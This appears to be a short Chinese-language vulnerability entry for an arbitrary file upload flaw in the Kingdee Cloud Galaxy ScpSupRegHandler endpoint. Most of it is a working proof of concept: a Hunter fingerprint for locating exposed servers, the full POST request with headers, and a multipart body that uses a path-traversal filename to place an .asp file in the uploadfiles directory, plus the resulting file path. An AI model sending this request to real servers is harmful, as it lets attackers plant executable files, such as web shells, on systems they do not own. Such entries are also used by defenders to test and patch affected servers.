# 金蝶云星空ScpSupRegHandler存在任意文件上传漏洞

- **系统**：金蝶　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`hunter：`app.name="Kingdee 金蝶云星空"``
- **请求**：`POST /k3cloud/SRM/ScpSupRegHandler HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Length: 311`　`Content-Type: multipart/form-data; boundary=hgth5DKrnI`　`SL-CE-SUID: 72`

**请求体 / payload**
```
--hgth5DKrnI
Content-Disposition: form-data; name="dbId_v"
.
--hgth5DKrnI
Content-Disposition: form-data; name="FID"
2022
--hgth5DKrnI
Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/test.asp."
Content-Type: text/plain
test
--hgth5DKrnI--

上传文件位置
/K3Cloud/uploadfiles/test.asp
```

**其他**
- 金蝶云星空ScpSupRegHandler存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 金蝶云星空-管理中心